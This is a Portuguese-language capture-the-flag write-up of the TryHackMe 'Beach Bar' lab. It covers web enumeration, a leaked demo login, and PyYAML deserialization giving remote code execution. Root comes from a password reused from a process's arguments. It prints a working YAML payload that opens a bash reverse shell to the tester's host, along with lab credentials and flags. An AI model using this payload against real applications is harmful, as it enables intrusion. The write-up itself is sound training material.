# 🏖️ Beach Bar — CTF Writeup
### TryHackMe | Boot-to-Root | Credencial em Comentário HTML · Desserialização Insegura de YAML (RCE) · Senha Exposta via ps aux

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                      |
| **Data do Relatório** | 31/07/2026                                                                             |
| **Data do Pentest**   | 31/07/2026 · 18:34 – 21:18 (GMT-3)                                                     |
| **Alvo**              | `10.67.185.26` — TryHackMe · Beach Bar                                                 |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Nmap 7.99 · Gobuster 3.8.2 · curl · Navegador (DevTools) · Netcat · PyYAML Deserialization |
| **Plataforma**        | TryHackMe — Boot-to-Root                                                               |

---

## 🔍 Resumo Executivo

Este relatório documenta o comprometimento completo da máquina **Beach Bar** (TryHackMe), um host **Ubuntu Linux**, por meio de uma cadeia de ataque que combina **exposição de credenciais em comentário HTML**, uma vulnerabilidade clássica de **desserialização insegura de YAML** (PyYAML) na funcionalidade de importação de playlists de um jukebox web, e **exposição de senha em texto claro** através dos argumentos de linha de comando de um processo em execução. O código-fonte da página de login continha uma credencial de demonstração esquecida (`dj:dj`). Com acesso autenticado, a funcionalidade de exportação/importação de playlists em YAML permitiu a injeção de uma tag de desserialização Python maliciosa (`!!python/object/apply`), resultando em **execução remota de código** e reverse shell como o usuário `bartender`. A escalada para root foi obtida observando um processo (`jukeboxd`) cuja senha de backend, passada como argumento de linha de comando, era visível via `ps aux` — e **reutilizada** como senha da própria conta root. As flags `user.txt` e `root.txt` foram capturadas com sucesso.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta                              | Versão | Finalidade                                                                     |
|-------------------------------------------|--------|-----------------------------------------------------------------------------------|
| **Nmap**                                  | 7.99   | Varredura de portas e fingerprinting de serviços (`-A -sC -Pn`)                  |
| **Gobuster**                              | 3.8.2  | Enumeração de diretórios e rotas web (wordlist `common.txt`)                     |
| **Navegador (DevTools / View-Source)**    | -      | Inspeção do código-fonte da página de login e cookies de sessão                 |
| **curl**                                  | -      | Autenticação e navegação programática via requisições HTTP                       |
| **PyYAML Deserialization**                | -      | Execução remota de código via importação de playlist YAML                       |
| **Netcat**                                | -      | Listener para recepção da reverse shell (`nc -lnvp 4444`)                       |

---

## 📋 Fases de Comprometimento

### FASE 1 — Reconhecimento: Varredura Nmap

> **18:34 GMT-3 · Nmap 7.99**

```bash
sudo nmap -A -sC -Pn -p- 10.67.185.26
```

```
22/tcp open  ssh    OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
80/tcp open  http   Gunicorn
|_http-title: Beach Bar // Sign in
|_Requested resource was /login
```

![Nmap](/Hacker%20Holiday%202026%20-%20THM/5º%20Level%20-%20Beach%20Bar/images/Nmap_Scan.png)

A raiz do site redirecionava para `/login` — indicando autenticação obrigatória.

---

### FASE 2 — Enumeração Web: Gobuster e Código-Fonte da Página de Login

> **18:34 – 18:37 GMT-3**

```bash
gobuster dir -u http://10.67.185.26/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50 -x txt,html,php --exclude-length 207
```

```
dashboard  (Status: 302) [Size: 199] → /login
export     (Status: 302) [Size: 199] → /login
import     (Status: 302) [Size: 199] → /login
login      (Status: 200) [Size: 3522]
logout     (Status: 302) [Size: 199] → /login
```

A inspeção do código-fonte da página de login (`view-source:`) revelou um comentário HTML esquecido pela equipe de desenvolvimento:

```html
<!--
staff note: the demo DJ login is still enabled for the soft opening.
dj / dj  -- swap this before the season starts (ticket BAR-7)
-->
```
![Gobuster & Source Code](/Hacker%20Holiday%202026%20-%20THM/5º%20Level%20-%20Beach%20Bar/images/Source_Code%20_Website.png)
> 🚩 **Credencial exposta (comentário HTML): `dj : dj`**

---

### FASE 3 — Acesso Inicial (Web): Login como dj

> **18:34 GMT-3**

```bash
curl -X POST http://10.67.185.26/login -d "username=dj&password=dj" -i
```

```
HTTP/1.1 302 FOUND
Set-Cookie: session=eyJ1c2VyIjoiZGoifQ...
Location: /dashboard
```

![Acesso Inicial](/Hacker%20Holiday%202026%20-%20THM/5º%20Level%20-%20Beach%20Bar/images/Export_Playlist.png)

O login foi bem-sucedido, concedendo acesso ao dashboard "Tonight on the floor", com as funcionalidades **Import** e **Export** de playlists do jukebox.

---

### FASE 4 — Exploração: Desserialização Insegura de YAML (Import de Playlist)

> **18:38 – 18:42 GMT-3**

A função **Export** gerou um arquivo `playlist.yml` com a estrutura da playlist atual:

![Exploit](/Hacker%20Holiday%202026%20-%20THM/6º%20Level%20-%20Overhead%20Breakfest/images/Exploit_Playlist.png)

```yaml
# Beach Bar jukebox playlist export
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
  - artist: Khruangbin
    title: Maria Tambien
  - artist: Men I Trust
    title: Show Me How
  - artist: Crumb
    title: Locket
```

O formato sugeria uso de desserialização YAML sem restrições (`yaml.load()` sem `Loader` seguro). Uma faixa maliciosa foi adicionada, explorando a tag `!!python/object/apply` do PyYAML para invocar `os.system` diretamente:

```yaml
- artist: Nistezy
  title: !!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/192.168.157.47/4444 0>&1'"]
```

Com o listener em escuta, o arquivo modificado foi enviado via **Import** (Load playlist):

```bash
nc -lnvp 4444
```

---

### FASE 5 — Acesso Inicial (Shell): Reverse Shell como bartender + user.txt

> **18:42 – 18:45 GMT-3**

A desserialização do YAML malicioso disparou o payload, retornando shell interativa:

```
listening on [any] 4444 ...
connect to [192.168.157.47] from (UNKNOWN) [10.67.185.26] 33680
bartender@tryhackme-2404:/opt/beach-bar/webapp$ whoami
bartender
```

![Acesso Inicial](/Hacker%20Holiday%202026%20-%20THM/5º%20Level%20-%20Beach%20Bar/images/Export_Playlist.png)

```bash
cd /home/bartender
cat user.txt
```

```
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

![User Flag](/Hacker%20Holiday%202026%20-%20THM/5º%20Level%20-%20Beach%20Bar/images/Passwd_and_User_Flag.png)
> 🚩 **user.txt — FLAG CAPTURADA: `THM{y4ml_pl4yl1st_pwns_th3_b34ch}`**

---

### FASE 6 — Escalada de Privilégios: Senha Exposta via ps aux + root.txt

> **18:45 – 18:58 GMT-3**

A enumeração localizou `/opt/beach-bar/jukeboxd/jukeboxd.py` — um serviço que recebia a senha de backend de streaming como **argumento de linha de comando** (`--stream-pass`):

```bash
ps aux | grep jukebox
```

```
root  608  0.0  0.2  ...  /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

A senha `SunsetSpritz2024!`, exposta em texto claro nos argumentos do processo, havia sido **reutilizada** como senha da conta root:

```bash
su root
# Password: SunsetSpritz2024!
whoami
root
cd /root
cat root.txt
```

```
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```
![Root Flag](/Hacker%20Holiday%202026%20-%20THM/5º%20Level%20-%20Beach%20Bar/images/Priv_Escalation_and_Root_Flag.png)
> 🚩 **root.txt — FLAG CAPTURADA: `THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}`**

---

## ⛓ Linha do Tempo do Comprometimento

```
[18:34 GMT-3] FASE 1 — RECONHECIMENTO (Nmap 7.99)
    SSH (22) e Gunicorn "Beach Bar // Sign in" (80) → redirect /login
    ↓
[18:34-18:37 GMT-3] FASE 2 — ENUMERAÇÃO WEB (Gobuster + View-Source)
    Rotas: dashboard, export, import, login, logout
    Comentário HTML → credenciais dj:dj
    ↓
[18:34 GMT-3] FASE 3 — ACESSO INICIAL (WEB)
    curl -X POST /login (dj:dj) → sessão autenticada
    Dashboard "Tonight on the floor" com Import/Export
    ↓
[18:38-18:42 GMT-3] FASE 4 — EXPLORAÇÃO (PyYAML Deserialization)
    Export → playlist.yml → payload !!python/object/apply:os.system
    Import do YAML malicioso → nc -lnvp 4444
    ↓
[18:42-18:45 GMT-3] FASE 5 — ACESSO INICIAL (SHELL)
    Reverse shell como bartender
    FLAG user.txt: THM{y4ml_pl4yl1st_pwns_th3_b34ch} ✓
    ↓
[18:45-18:58 GMT-3] FASE 6 — ESCALADA DE PRIVILÉGIOS
    ps aux → --stream-pass SunsetSpritz2024! exposto
    su root (senha reutilizada) → root
    FLAG root.txt: THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r} ✓
    ↓
[18:58 GMT-3] COMPROMETIMENTO TOTAL — root@tryhackme-2404
```

---

## 🗺 Mapeamento Investigativo

| Fase | Ferramenta/Técnica | Achado |
|------|--------------------|--------|
| Reconhecimento | Nmap 7.99 | SSH (22) e Gunicorn "Beach Bar" (80), redirect /login |
| Enumeração Web | Gobuster + View-Source | Credenciais `dj:dj` em comentário HTML |
| Acesso Inicial (Web) | curl / Login | Autenticado como `dj` |
| Exploração RCE | PyYAML Deserialization (`!!python/object/apply`) | Reverse shell via Import de playlist |
| Acesso Inicial (Shell) | Netcat | Shell como `bartender`; flag `user.txt` |
| Escalada de Privilégio | `ps aux` (credencial exposta) | Senha reutilizada em `root`; flag `root.txt` |

---

## 🚨 Artefatos e Indicadores Identificados

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Alvo | `10.67.185.26` | Máquina Beach Bar (TryHackMe) — Ubuntu Linux (Gunicorn) |
| Serviços expostos | `22/TCP` (OpenSSH 9.6p1) · `80/TCP` (Gunicorn) | Superfície de ataque inicial |
| Credencial exposta | `dj : dj` | Comentário HTML na página `/login` |
| Rotas da aplicação | `/dashboard`, `/export`, `/import`, `/logout` | Mapeadas via Gobuster |
| Vulnerabilidade | Desserialização insegura de YAML (PyYAML) | Tag `!!python/object/apply` permite RCE |
| Payload de exploração | `os.system("bash -c 'bash -i >& /dev/tcp/...'")` | Injetado no campo `title` da playlist |
| Serviço vulnerável | `/opt/beach-bar/jukeboxd/jukeboxd.py` | Senha de backend em argumento de linha de comando |
| Credencial exposta (processo) | `--stream-pass SunsetSpritz2024!` | Visível via `ps aux` |
| Credencial comprometida (root) | `SunsetSpritz2024!` | Reutilizada da senha de streaming |
| Flag user | `THM{y4ml_pl4yl1st_pwns_th3_b34ch}` | `/home/bartender/user.txt` |
| Flag root | `THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}` | `/root/root.txt` |
| Técnica (MITRE ATT&CK) | `T1552.001` | Unsecured Credentials: Credentials In Files |
| Técnica (MITRE ATT&CK) | `T1190` | Exploit Public-Facing Application |
| Técnica (MITRE ATT&CK) | `T1059` | Command and Scripting Interpreter |

---

## ✅ Resumo das Flags

| # | Flag | Valor |
|---|------|-------|
| 🚩 user.txt | `/home/bartender/user.txt` | `THM{y4ml_pl4yl1st_pwns_th3_b34ch}` |
| 🚩 root.txt | `/root/root.txt` | `THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}` |

---

## 📚 Referências

- [TryHackMe — Beach Bar](https://tryhackme.com/room/beachbar)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [PyYAML Documentation — safe_load vs load](https://pyyaml.org/wiki/PyYAMLDocumentation)
- [MITRE ATT&CK T1552.001 — Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
- [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [MITRE ATT&CK T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)

---